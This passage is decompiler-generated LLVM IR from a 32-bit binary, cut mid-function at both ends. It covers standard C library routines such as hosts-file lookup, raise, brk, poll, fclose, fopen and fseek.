dec_label_pc_8057023:                             ; preds = %dec_label_pc_805704b.preheader, %dec_label_pc_8057023.dec_label_pc_8057023_crit_edge
  %v0_805704b105 = phi i32 [ %v0_805704b, %dec_label_pc_8057023.dec_label_pc_8057023_crit_edge ], [ %v0_805704b100, %dec_label_pc_805704b.preheader ]
  %v1_8057023 = add i32 %v0_805704b105, -1
  %v1_8057027 = mul i32 %v1_8057023, 4
  %v2_8057027 = add i32 %v1_8057027, 134634360
  %v3_8057027 = inttoptr i32 %v2_8057027 to i32*
  %v4_8057027 = load i32, i32* %v3_8057027, align 4
  store i32 %v1_8057023, i32* @global_var_8065b98.1018, align 8
  %v1_8057033 = call i32 @free(i32 %v4_8057027)
  %v0_8057038 = load i32, i32* @global_var_8065b98.1018, align 8
  %v1_8057040 = mul i32 %v0_8057038, 4
  %v2_8057040 = add i32 %v1_8057040, ptrtoint (i32* @global_var_8065b78.1026 to i32)
  %v3_8057040 = inttoptr i32 %v2_8057040 to i32*
  store i32 0, i32* %v3_8057040, align 4
  %v0_805704b = load i32, i32* @global_var_8065b98.1018, align 8
  %tmp43 = icmp slt i32 %v0_805704b, 1
  %tmp44 = icmp eq i1 %tmp43, false
  br i1 %tmp44, label %dec_label_pc_8057023.dec_label_pc_8057023_crit_edge, label %dec_label_pc_8057054

dec_label_pc_8057023.dec_label_pc_8057023_crit_edge: ; preds = %dec_label_pc_8057023
  br label %dec_label_pc_8057023

dec_label_pc_8057054:                             ; preds = %dec_label_pc_8057023, %dec_label_pc_805704b.preheader
  %v0_805704b.lcssa = phi i32 [ %v0_805704b100, %dec_label_pc_805704b.preheader ], [ %v0_805704b, %dec_label_pc_8057023 ]
  store i32 1, i32* @esi, align 4
  %v5_8057081115 = icmp sgt i32 %stack_var_-196.0.lcssa, 1
  br i1 %v5_8057081115, label %dec_label_pc_8057083, label %dec_label_pc_805708e

dec_label_pc_805705b:                             ; preds = %dec_label_pc_8057083
  %v2_805705e = mul i32 %v0_8057065117, 4
  %v4_805705e = add i32 %v2_805705e, %v3_8056fc9
  %v5_805705e = inttoptr i32 %v4_805705e to i32*
  %v6_805705e = load i32, i32* %v5_805705e, align 4
  %v1_8057065 = add i32 %v0_8057065117, 1
  store i32 %v1_8057065, i32* @esi, align 4
  %v1_8057066 = inttoptr i32 %v6_805705e to i8*
  %v2_8057066 = call i32 @__GI_strdup(i8* %v1_8057066)
  %v1_805706e = load i32, i32* @ebx, align 4
  %v2_805706e = mul i32 %v1_805706e, 4
  %v3_805706e = add i32 %v2_805706e, 134634360
  %v4_805706e = inttoptr i32 %v3_805706e to i32*
  store i32 %v2_8057066, i32* %v4_805706e, align 4
  %v0_8057075 = load i32, i32* @ebx, align 4
  %v1_8057075 = add i32 %v0_8057075, 1
  store i32 %v1_8057075, i32* @global_var_8065b98.1018, align 8
  %v0_805707d.pre = load i32, i32* @esi, align 4
  %v5_8057081 = icmp slt i32 %v0_805707d.pre, %stack_var_-196.0.lcssa
  br i1 %v5_8057081, label %dec_label_pc_8057083, label %dec_label_pc_805708e

dec_label_pc_8057083:                             ; preds = %dec_label_pc_8057054, %dec_label_pc_805705b
  %v0_8057065117 = phi i32 [ %v0_805707d.pre, %dec_label_pc_805705b ], [ 1, %dec_label_pc_8057054 ]
  %v0_8057083116 = phi i32 [ %v1_8057075, %dec_label_pc_805705b ], [ %v0_805704b.lcssa, %dec_label_pc_8057054 ]
  store i32 %v0_8057083116, i32* @ebx, align 4
  %v7_805708c = icmp sgt i32 %v0_8057083116, 3
  br i1 %v7_805708c, label %dec_label_pc_805708e, label %dec_label_pc_805705b

dec_label_pc_805708e:                             ; preds = %dec_label_pc_8056f1b.preheader, %dec_label_pc_8056f1a, %dec_label_pc_8057054, %dec_label_pc_8057083, %dec_label_pc_805705b, %dec_label_pc_805700d, %dec_label_pc_8056f3c, %dec_label_pc_8056f33, %dec_label_pc_805708e.preheader
  %v0_805708e = load i32, i32* @edx, align 4
  store i32 128, i32* %stack_var_-216, align 4
  store i32 %v2_8057095, i32* @ebx, align 4
  %v3_805709a = call i32 @fgets(i32 %v2_8057095, i32 128, i32 %v0_805708e)
  store i32 %v3_805709a, i32* @eax, align 4
  %v1_80570a2 = icmp eq i32 %v3_805709a, 0
  %v1_80570a4 = icmp eq i1 %v1_80570a2, false
  br i1 %v1_80570a4, label %dec_label_pc_8056f1b.preheader, label %dec_label_pc_80570aa

dec_label_pc_8056f1b.preheader:                   ; preds = %dec_label_pc_805708e
  %v0_8056f1b.pre = load i32, i32* @ebx, align 4
  %v4_8056f1b.pre = load i32, i32* @ecx, align 4
  %v1_8056f1b49 = inttoptr i32 %v0_8056f1b.pre to i8*
  %v2_8056f1b50 = load i8, i8* %v1_8056f1b49, align 1
  %v3_8056f1b51 = zext i8 %v2_8056f1b50 to i32
  %v5_8056f1b52 = and i32 %v4_8056f1b.pre, -256
  %v6_8056f1b53 = or i32 %v3_8056f1b51, %v5_8056f1b52
  store i32 %v6_8056f1b53, i32* @ecx, align 4
  %v4_8056f1d54 = icmp eq i8 %v2_8056f1b50, 0
  br i1 %v4_8056f1d54, label %dec_label_pc_805708e, label %dec_label_pc_8056f25.lr.ph

dec_label_pc_8056f25.lr.ph:                       ; preds = %dec_label_pc_8056f1b.preheader
  %v0_8056f25.pre = load i32, i32* @global_var_805f23c, align 4
  br label %dec_label_pc_8056f25

dec_label_pc_80570aa:                             ; preds = %dec_label_pc_805708e
  %v0_80570ad = load i32, i32* @ebp, align 4
  %v1_80570ae = inttoptr i32 %v0_80570ad to i16*
  %v2_80570ae = call i32 @__GI_fclose(i16* %v1_80570ae)
  br label %dec_label_pc_80570c3

dec_label_pc_80570b8:                             ; preds = %dec_label_pc_8056ef7
  %v0_80570b8 = call i32 @__GI___h_errno_location()
  %v1_80570bd = inttoptr i32 %v0_80570b8 to i32*
  store i32 3, i32* %v1_80570bd, align 4
  br label %dec_label_pc_80570c3

dec_label_pc_80570c3:                             ; preds = %entry, %dec_label_pc_80570aa, %dec_label_pc_80570b8
  store i32 1, i32* %stack_var_-216, align 4
  store i32 %v2_8056eb0, i32* @eax, align 4
  %v2_80570cf = call i32 @__pthread_return_void(i32 %v2_8056eb0, i32 1)
  store i32 %v0_8056e9c, i32* @ebp, align 4
  ret i32 %v2_80570cf

; uselistorder directives
  uselistorder i32 %v0_8056f25.pre, { 1, 0 }
  uselistorder i32 %v6_8056f1b53, { 1, 0 }
  uselistorder i8 %v2_8056f1b50, { 1, 2, 0 }
  uselistorder i8* %v1_8056f1b49, { 1, 0 }
  uselistorder i32 %v0_8056f1b.pre, { 1, 0 }
  uselistorder i32 %v0_805704b, { 0, 2, 1 }
  uselistorder i32 %v0_8056fee, { 1, 0 }
  uselistorder i32 %stack_var_-196.0.lcssa, { 3, 0, 2, 1 }
  uselistorder i32 %stack_var_-196.013, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v2_8056f86, { 1, 0 }
  uselistorder i32 %v2_8056f67, { 1, 0 }
  uselistorder i32 %v1_8056f5b, { 0, 2, 1, 3 }
  uselistorder i32 %v2_8056f2a, { 1, 0 }
  uselistorder i32 %v1_8056f1a, { 1, 0, 2 }
  uselistorder i32* %stack_var_-216, { 0, 1, 2, 3, 4, 5, 6, 8, 7 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32 ()* @__GI___h_errno_location, { 6, 5, 4, 3, 0, 2, 1 }
  uselistorder i32* @global_var_8065b98.1018, { 1, 2, 3, 4, 0, 5, 6, 7 }
  uselistorder i32 152, { 2, 1, 3, 4, 0 }
  uselistorder i32 164, { 2, 1, 0 }
  uselistorder i32* @global_var_8065b94.954, { 1, 0, 2, 3 }
  uselistorder i32 ptrtoint (i32* @global_var_805f4a8.953 to i32), { 1, 3, 4, 5, 6, 7, 8, 0, 2, 9 }
  uselistorder label %dec_label_pc_80570c3, { 2, 1, 0 }
  uselistorder label %dec_label_pc_805708e, { 0, 3, 4, 2, 5, 6, 7, 1, 8 }
  uselistorder label %dec_label_pc_8057083, { 1, 0 }
  uselistorder label %dec_label_pc_8057023, { 1, 0 }
  uselistorder label %dec_label_pc_805704b.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_8056ff9, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_8056fee, { 1, 0 }
  uselistorder label %dec_label_pc_8056fa4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8056f9d, { 1, 0 }
  uselistorder label %dec_label_pc_8056f94, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8056f81, { 1, 0 }
  uselistorder label %dec_label_pc_8056f62, { 1, 0 }
  uselistorder label %dec_label_pc_805708e.preheader, { 1, 0 }
}

define i32 @__get_hosts_byname_r(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %v9_8057103 = inttoptr i32 %arg3 to i32*
  %v10_8057103 = call i32 @__read_etc_hosts_r(i32 0, i32 %arg1, i32 %arg2, i32 0, i32* %v9_8057103, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7)
  ret i32 %v10_8057103
}

define i32 @__raise(i32 %arg1) local_unnamed_addr {
entry:
  %v0_805710f = call i32 @__libc_getpid()
  %v2_805711b = call i32 @kill(i32 %v0_805710f, i32 %arg1)
  ret i32 %v2_805711b

; uselistorder directives
  uselistorder i32 (i32, i32)* @kill, { 0, 3, 1, 2 }
  uselistorder i32 ()* @__libc_getpid, { 0, 3, 2, 1 }
}

define i32 @_dl_aux_init() local_unnamed_addr {
entry:
  %v0_8057124 = load i32, i32* @eax, align 4
  %v1_8057124 = add i32 %v0_8057124, 28
  %v2_8057124 = inttoptr i32 %v1_8057124 to i32*
  %v3_8057124 = load i32, i32* %v2_8057124, align 4
  store i32 %v3_8057124, i32* @global_var_8065b9c.1027, align 4
  %v1_805712d = add i32 %v0_8057124, 44
  %v2_805712d = inttoptr i32 %v1_805712d to i32*
  %v3_805712d = load i32, i32* %v2_805712d, align 4
  store i32 %v3_805712d, i32* @global_var_8065ba0.1028, align 32
  ret i32 %v3_805712d
}

define i32 @__GI_brk(i32 %arg1) local_unnamed_addr {
entry:
  %ecx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8057138 = load i32, i32* @ebx, align 4
  store i32 %v0_8057138, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ecx.global-to-local, align 4
  %v1_805714b = call i32 @int80_syscall(i32 45)
  store i32 0, i32* %ecx.global-to-local, align 4
  store i32 %v1_805714b, i32* @global_var_8065764.1005, align 4
  %v7_8057156 = icmp ult i32 %v1_805714b, %arg1
  %v1_8057158 = icmp eq i1 %v7_8057156, false
  br i1 %v1_8057158, label %dec_label_pc_8057168, label %dec_label_pc_805715a

dec_label_pc_805715a:                             ; preds = %entry
  %v0_805715a = load i32, i32* %stack_var_-4, align 4
  %v1_805715a = call i32 @__errno_location(i32 %v0_805715a)
  store i32 -1, i32* %ecx.global-to-local, align 4
  %v1_8057162 = inttoptr i32 %v1_805715a to i32*
  store i32 12, i32* %v1_8057162, align 4
  %v0_8057169.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8057168

dec_label_pc_8057168:                             ; preds = %entry, %dec_label_pc_805715a
  %v0_8057169 = phi i32 [ 0, %entry ], [ %v0_8057169.pre, %dec_label_pc_805715a ]
  %v2_805716c = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805716c, i32* @ebx, align 4
  ret i32 %v0_8057169

; uselistorder directives
  uselistorder i32 %v1_805714b, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32* @global_var_8065764.1005, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8057168, { 1, 0 }
}

define i32 @__libc_poll() local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_8057170 = load i32, i32* @edi, align 4
  store i32 %v0_8057170, i32* %stack_var_-4, align 4
  store i32 %tmp4, i32* %edi.global-to-local, align 4
  %v0_8057180 = load i32, i32* @ebx, align 4
  %v1_8057181 = inttoptr i32 %tmp4 to %pollfd*
  %v5_8057188 = call i32 @poll(%pollfd* %v1_8057181, i32 %tmp3, i32 %tmp)
  store i32 %v0_8057180, i32* @ebx, align 4
  store i32 %v5_8057188, i32* %edi.global-to-local, align 4
  %tmp10 = icmp ult i32 %v5_8057188, -4095
  br i1 %tmp10, label %dec_label_pc_80571a0, label %dec_label_pc_8057194

dec_label_pc_8057194:                             ; preds = %entry
  %v1_8057194 = call i32 @__errno_location(i32 %v0_8057180)
  %v0_8057199 = load i32, i32* %edi.global-to-local, align 4
  %v1_8057199 = sub i32 0, %v0_8057199
  %v2_805719b = inttoptr i32 %v1_8057194 to i32*
  store i32 %v1_8057199, i32* %v2_805719b, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_80571a0

dec_label_pc_80571a0:                             ; preds = %entry, %dec_label_pc_8057194
  %v0_80571a1 = phi i32 [ %v5_8057188, %entry ], [ -1, %dec_label_pc_8057194 ]
  %v2_80571a4 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80571a4, i32* @edi, align 4
  ret i32 %v0_80571a1

; uselistorder directives
  uselistorder i32 %v5_8057188, { 1, 0, 2 }
  uselistorder i32 %v0_8057180, { 1, 0 }
  uselistorder label %dec_label_pc_80571a0, { 1, 0 }
}

define i32 @__GI_fclose(i16* %arg1) local_unnamed_addr {
entry:
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v4_80571af = ptrtoint i16* %arg1 to i32
  store i32 %v4_80571af, i32* @esi, align 4
  %v1_80571b3 = add i32 %v4_80571af, 52
  %v2_80571b3 = inttoptr i32 %v1_80571b3 to i32*
  %v3_80571b3 = load i32, i32* %v2_80571b3, align 4
  store i32 %v3_80571b3, i32* @ebp, align 4
  %v1_80571b6 = icmp eq i32 %v3_80571b3, 0
  %v1_80571b8 = icmp eq i1 %v1_80571b6, false
  br i1 %v1_80571b8, label %dec_label_pc_80571d9, label %dec_label_pc_80571ba

dec_label_pc_80571ba:                             ; preds = %entry
  %v1_80571ba = add i32 %v4_80571af, 56
  store i32 %v1_80571ba, i32* @ebx, align 4
  %v2_80571c4 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_80571c4, i32* @eax, align 4
  %v2_80571c9 = call i32 @__pthread_return_void(i32 %v2_80571c4, i32 134567199)
  %v0_80571ce = load i32, i32* @ebx, align 4
  %v1_80571d1 = call i32 @__pthread_return_0(i32 %v0_80571ce)
  store i32 %v1_80571d1, i32* @eax, align 4
  %v0_80571db.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_80571d9

dec_label_pc_80571d9:                             ; preds = %entry, %dec_label_pc_80571ba
  %v0_80571e3 = phi i32 [ %v4_80571af, %entry ], [ %v0_80571db.pre, %dec_label_pc_80571ba ]
  store i32 0, i32* @edi, align 4
  %v1_80571db = inttoptr i32 %v0_80571e3 to i8*
  %v2_80571db = load i8, i8* %v1_80571db, align 1
  %v3_80571db = and i8 %v2_80571db, 64
  %v4_80571db = icmp eq i8 %v3_80571db, 0
  br i1 %v4_80571db, label %dec_label_pc_80571d9.dec_label_pc_80571ee_crit_edge, label %dec_label_pc_80571e0

dec_label_pc_80571d9.dec_label_pc_80571ee_crit_edge: ; preds = %dec_label_pc_80571d9
  br label %dec_label_pc_80571ee

dec_label_pc_80571e0:                             ; preds = %dec_label_pc_80571d9
  %v1_80571e4 = inttoptr i32 %v0_80571e3 to i16*
  %v2_80571e4 = call i32 @fflush_unlocked(i16* %v1_80571e4)
  store i32 %v2_80571e4, i32* @edi, align 4
  %v0_80571f1.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_80571ee

dec_label_pc_80571ee:                             ; preds = %dec_label_pc_80571d9.dec_label_pc_80571ee_crit_edge, %dec_label_pc_80571e0
  %v0_80571f1 = phi i32 [ %v0_80571e3, %dec_label_pc_80571d9.dec_label_pc_80571ee_crit_edge ], [ %v0_80571f1.pre, %dec_label_pc_80571e0 ]
  %v1_80571f1 = add i32 %v0_80571f1, 4
  %v2_80571f1 = inttoptr i32 %v1_80571f1 to i32*
  %v3_80571f1 = load i32, i32* %v2_80571f1, align 4
  %v1_80571f4 = call i32 @__libc_close(i32 %v3_80571f1)
  %v0_80571fc = load i32, i32* @esi, align 4
  %v1_80571fc = add i32 %v0_80571fc, 4
  %v2_80571fc = inttoptr i32 %v1_80571fc to i32*
  store i32 -1, i32* %v2_80571fc, align 4
  %v2_805720d = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_805720d, i32* @ebx, align 4
  %v2_8057212 = icmp slt i32 %v1_80571f4, 0
  store i32 -1, i32* @eax, align 4
  %v1_8057219 = load i32, i32* @edi, align 4
  %v3_8057219 = select i1 %v2_8057212, i32 -1, i32 %v1_8057219
  store i32 %v3_8057219, i32* @edi, align 4
  %v2_805721c = call i32 @__pthread_return_void(i32 %v2_805720d, i32 134567199)
  %v1_8057228 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805f278.923 to i32))
  %v0_805722d = load i32, i32* @global_var_8063504.1029, align 4
  %v1_8057232 = add i32 %v0_805722d, 1
  store i32 %v1_8057232, i32* @global_var_8063504.1029, align 4
  store i32 ptrtoint (i32* @global_var_805f278.923 to i32), i32* @eax, align 4
  %v2_805723d = call i32 @__pthread_return_void(i32 %v2_805720d, i32 1)
  %v0_8057242 = load i32, i32* @esi, align 4
  %v1_8057242 = inttoptr i32 %v0_8057242 to i32*
  %v2_8057242 = load i32, i32* %v1_8057242, align 4
  %v1_8057247 = and i32 %v2_8057242, 24576
  %v1_805724c = or i32 %v1_8057247, 48
  store i32 %v1_805724c, i32* @eax, align 4
  %v1_8057251 = trunc i32 %v1_805724c to i16
  %v3_8057251 = inttoptr i32 %v0_8057242 to i16*
  store i16 %v1_8057251, i16* %v3_8057251, align 2
  br i1 %v1_80571b8, label %dec_label_pc_8057267, label %dec_label_pc_8057256

dec_label_pc_8057256:                             ; preds = %dec_label_pc_80571ee
  %v2_805725a = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_805725a, i32* @eax, align 4
  %v2_805725f = call i32 @__pthread_return_void(i32 %v2_805725a, i32 1)
  store i32 %v2_805725f, i32* @eax, align 4
  br label %dec_label_pc_8057267

dec_label_pc_8057267:                             ; preds = %dec_label_pc_80571ee, %dec_label_pc_8057256
  %v0_8057267 = load i32, i32* @esi, align 4
  %v1_8057267 = add i32 %v0_8057267, 1
  %v2_8057267 = inttoptr i32 %v1_8057267 to i8*
  %v3_8057267 = load i8, i8* %v2_8057267, align 1
  %v4_8057267 = and i8 %v3_8057267, 64
  %v5_8057267 = icmp eq i8 %v4_8057267, 0
  br i1 %v5_8057267, label %dec_label_pc_805727b, label %dec_label_pc_805726d

dec_label_pc_805726d:                             ; preds = %dec_label_pc_8057267
  %v1_8057270 = add i32 %v0_8057267, 8
  %v2_8057270 = inttoptr i32 %v1_8057270 to i32*
  %v3_8057270 = load i32, i32* %v2_8057270, align 4
  %v1_8057273 = call i32 @free(i32 %v3_8057270)
  store i32 %v1_8057273, i32* @eax, align 4
  br label %dec_label_pc_805727b

dec_label_pc_805727b:                             ; preds = %dec_label_pc_8057267, %dec_label_pc_805726d
  %v2_8057287 = call i32 @__pthread_return_void(i32 %v2_805720d, i32 134567199)
  %v1_8057293 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805f278.923 to i32))
  store i32 ptrtoint (i32* @global_var_805f278.923 to i32), i32* @eax, align 4
  %v0_8057299 = load i32, i32* @global_var_8063508.1030, align 8
  %v1_8057299 = add i32 %v0_8057299, 1
  store i32 %v1_8057299, i32* @global_var_8063508.1030, align 8
  %v2_80572a3 = call i32 @__pthread_return_void(i32 %v2_805720d, i32 1)
  %v0_80572a8 = call i32 @_stdio_openlist_dec_use()
  %v0_80572b0 = load i32, i32* @edi, align 4
  ret i32 %v0_80572b0

; uselistorder directives
  uselistorder i32 %v2_805720d, { 1, 2, 3, 0, 4 }
  uselistorder i32 (i32)* @__libc_close, { 16, 15, 14, 13, 33, 32, 31, 12, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_805727b, { 1, 0 }
  uselistorder label %dec_label_pc_8057267, { 1, 0 }
  uselistorder label %dec_label_pc_80571ee, { 1, 0 }
  uselistorder label %dec_label_pc_80571d9, { 1, 0 }
}

define i32 @__GI_fopen(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v4_80572c7 = inttoptr i32 %arg2 to i8*
  %v5_80572c7 = call i32 @_stdio_fopen(i32 %arg1, i8* %v4_80572c7, i32 0, i32 -1)
  ret i32 %v5_80572c7
}

define i32 @__GI_fseek(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v1_80572db = ashr i32 %arg2, 31
  %v4_80572e2 = inttoptr i32 %arg1 to i16*
  %v5_80572e2 = call i32 @__GI_fseeko64(i16* %v4_80572e2, i32 %arg2, i32 %v1_80572db, i32 %arg3)
  ret i32 %v5_80572e2
}

define i32 @__GI_fseeko64(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v0_80572ec = load i32, i32* @ebp, align 4
  %v0_80572ed = load i32, i32* @edi, align 4
  %v0_80572ee = load i32, i32* @esi, align 4
  %v0_80572ef = load i32, i32* @ebx, align 4
  store i32 %arg4, i32* @edi, align 4
  store i32 %arg2, i32* %eax.global-to-local, align 4
  store i32 %arg3, i32* @edx, align 4
  %v4_80572ff = ptrtoint i16* %arg1 to i32
  store i32 %v4_80572ff, i32* @esi, align 4
  store i32 %arg2, i32* %stack_var_-28, align 4
  %tmp = icmp ult i32 %arg4, 3
  br i1 %tmp, label %dec_label_pc_8057323, label %dec_label_pc_8057310

dec_label_pc_8057310:                             ; preds = %entry
  %v1_8057310 = call i32 @__errno_location(i32 %arg2)
  store i32 %v1_8057310, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v1_8057318 = inttoptr i32 %v1_8057310 to i32*
  store i32 22, i32* %v1_8057318, align 4
  br label %dec_label_pc_80573c9

dec_label_pc_8057323:                             ; preds = %entry
  %v1_8057323 = add i32 %v4_80572ff, 52
  %v2_8057323 = inttoptr i32 %v1_8057323 to i32*
  %v3_8057323 = load i32, i32* %v2_8057323, align 4
  %v1_8057326 = icmp eq i32 %v3_8057323, 0
  %v1_8057328 = icmp eq i1 %v1_8057326, false
  br i1 %v1_8057328, label %dec_label_pc_8057349, label %dec_label_pc_805732a

dec_label_pc_805732a:                             ; preds = %dec_label_pc_8057323
  %v1_805732a = add i32 %v4_80572ff, 56
  store i32 %v1_805732a, i32* @ebx, align 4
  %v2_8057334 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_8057334, i32* @eax, align 4
  %v3_8057339 = call i32 @__pthread_return_void(i32 %v2_8057334, i32 134567199)
  store i32 %v3_8057339, i32* %eax.global-to-local, align 4
  %v0_805733e = load i32, i32* @ebx, align 4
  %v2_8057341 = call i32 @__pthread_return_0(i32 %v0_805733e)
  store i32 %v2_8057341, i32* %eax.global-to-local, align 4
  %v0_8057349.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8057349

dec_label_pc_8057349:                             ; preds = %dec_label_pc_8057323, %dec_label_pc_805732a
  %v0_8057351 = phi i32 [ %v4_80572ff, %dec_label_pc_8057323 ], [ %v0_8057349.pre, %dec_label_pc_805732a ]
  %v1_8057349 = inttoptr i32 %v0_8057351 to i8*
  %v2_8057349 = load i8, i8* %v1_8057349, align 1
  %v3_8057349 = and i8 %v2_8057349, 64
  %v4_8057349 = icmp eq i8 %v3_8057349, 0
  br i1 %v4_8057349, label %dec_label_pc_805735e, label %dec_label_pc_805734e

dec_label_pc_805734e:                             ; preds = %dec_label_pc_8057349
  %v2_8057352 = call i32 @__stdio_wcommit(i32 %v0_8057351)
  store i32 %v2_8057352, i32* %eax.global-to-local, align 4
  %v1_805735a = icmp eq i32 %v2_8057352, 0
  %v1_805735c = icmp eq i1 %v1_805735a, false
  br i1 %v1_805735c, label %dec_label_pc_80573b1, label %dec_label_pc_805735e

dec_label_pc_805735e:                             ; preds = %dec_label_pc_805734e, %dec_label_pc_8057349
  %v0_805735e = load i32, i32* @edi, align 4
  %v9_805735e = icmp eq i32 %v0_805735e, 1
  %v1_8057361 = icmp eq i1 %v9_805735e, false
  br i1 %v1_8057361, label %dec_label_pc_805735e.dec_label_pc_8057377_crit_edge, label %dec_label_pc_8057363

dec_label_pc_805735e.dec_label_pc_8057377_crit_edge: ; preds = %dec_label_pc_805735e
  %.pre6 = ptrtoint i32* %stack_var_-28 to i32
  br label %dec_label_pc_8057377

dec_label_pc_8057363:                             ; preds = %dec_label_pc_805735e
  %v0_8057363 = load i32, i32* @ecx, align 4
  %v2_8057365 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8057365, i32* %eax.global-to-local, align 4
  %v0_805736a = load i32, i32* @esi, align 4
  %v5_805736a = inttoptr i32 %v0_805736a to i16*
  %v6_805736b = call i32 @__stdio_adjust_position(i16* %v5_805736a, i32 %v2_8057365, i32 %v0_8057363, i32 %v0_8057363)
  store i32 %v6_805736b, i32* %eax.global-to-local, align 4
  %v2_8057373 = icmp slt i32 %v6_805736b, 0
  br i1 %v2_8057373, label %dec_label_pc_80573b1, label %dec_label_pc_8057363.dec_label_pc_8057377_crit_edge

dec_label_pc_8057363.dec_label_pc_8057377_crit_edge: ; preds = %dec_label_pc_8057363
  %v0_8057378.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8057377

dec_label_pc_8057377:                             ; preds = %dec_label_pc_805735e.dec_label_pc_8057377_crit_edge, %dec_label_pc_8057363.dec_label_pc_8057377_crit_edge
  %v2_8057379.pre-phi = phi i32 [ %.pre6, %dec_label_pc_805735e.dec_label_pc_8057377_crit_edge ], [ %v2_8057365, %dec_label_pc_8057363.dec_label_pc_8057377_crit_edge ]
  %v0_8057378 = phi i32 [ %v0_805735e, %dec_label_pc_805735e.dec_label_pc_8057377_crit_edge ], [ %v0_8057378.pre, %dec_label_pc_8057363.dec_label_pc_8057377_crit_edge ]
  %v0_8057377 = load i32, i32* @edx, align 4
  store i32 %v2_8057379.pre-phi, i32* %eax.global-to-local, align 4
  %v0_805737e = load i32, i32* @esi, align 4
  %v5_805737f = inttoptr i32 %v2_8057379.pre-phi to i32*
  %v6_805737f = call i32 @__stdio_seek(i32 %v0_805737e, i32* %v5_805737f, i32 %v0_8057378, i32 %v0_8057377)
  store i32 %v6_805737f, i32* %eax.global-to-local, align 4
  %v2_8057387 = icmp slt i32 %v6_805737f, 0
  br i1 %v2_8057387, label %dec_label_pc_80573b1, label %dec_label_pc_805738b

dec_label_pc_805738b:                             ; preds = %dec_label_pc_8057377
  %v0_805738b = load i32, i32* @esi, align 4
  %v1_805738b = inttoptr i32 %v0_805738b to i32*
  %v2_805738b = load i32, i32* %v1_805738b, align 4
  store i32 %v2_805738b, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v1_805738f = add i32 %v0_805738b, 44
  %v2_805738f = inttoptr i32 %v1_805738f to i32*
  store i32 0, i32* %v2_805738f, align 4
  %v0_8057396 = load i32, i32* @esi, align 4
  %v1_8057396 = add i32 %v0_8057396, 2
  %v2_8057396 = inttoptr i32 %v1_8057396 to i8*
  store i8 0, i8* %v2_8057396, align 1
  %v0_805739a = load i32, i32* %eax.global-to-local, align 4
  %v1_805739a = and i32 %v0_805739a, -72
  store i32 %v1_805739a, i32* %eax.global-to-local, align 4
  %v1_805739d = trunc i32 %v1_805739a to i16
  %v2_805739d = load i32, i32* @esi, align 4
  %v3_805739d = inttoptr i32 %v2_805739d to i16*
  store i16 %v1_805739d, i16* %v3_805739d, align 2
  %v0_80573a0 = load i32, i32* @esi, align 4
  %v1_80573a0 = add i32 %v0_80573a0, 8
  %v2_80573a0 = inttoptr i32 %v1_80573a0 to i32*
  %v3_80573a0 = load i32, i32* %v2_80573a0, align 4
  store i32 %v3_80573a0, i32* %eax.global-to-local, align 4
  %v2_80573a3 = add i32 %v0_80573a0, 16
  %v3_80573a3 = inttoptr i32 %v2_80573a3 to i32*
  store i32 %v3_80573a0, i32* %v3_80573a3, align 4
  %v0_80573a6 = load i32, i32* %eax.global-to-local, align 4
  %v1_80573a6 = load i32, i32* @esi, align 4
  %v2_80573a6 = add i32 %v1_80573a6, 20
  %v3_80573a6 = inttoptr i32 %v2_80573a6 to i32*
  store i32 %v0_80573a6, i32* %v3_80573a6, align 4
  %v0_80573a9 = load i32, i32* %eax.global-to-local, align 4
  %v1_80573a9 = load i32, i32* @esi, align 4
  %v2_80573a9 = add i32 %v1_80573a9, 24
  %v3_80573a9 = inttoptr i32 %v2_80573a9 to i32*
  store i32 %v0_80573a9, i32* %v3_80573a9, align 4
  %v0_80573ac = load i32, i32* %eax.global-to-local, align 4
  %v1_80573ac = load i32, i32* @esi, align 4
  %v2_80573ac = add i32 %v1_80573ac, 28
  %v3_80573ac = inttoptr i32 %v2_80573ac to i32*
  store i32 %v0_80573ac, i32* %v3_80573ac, align 4
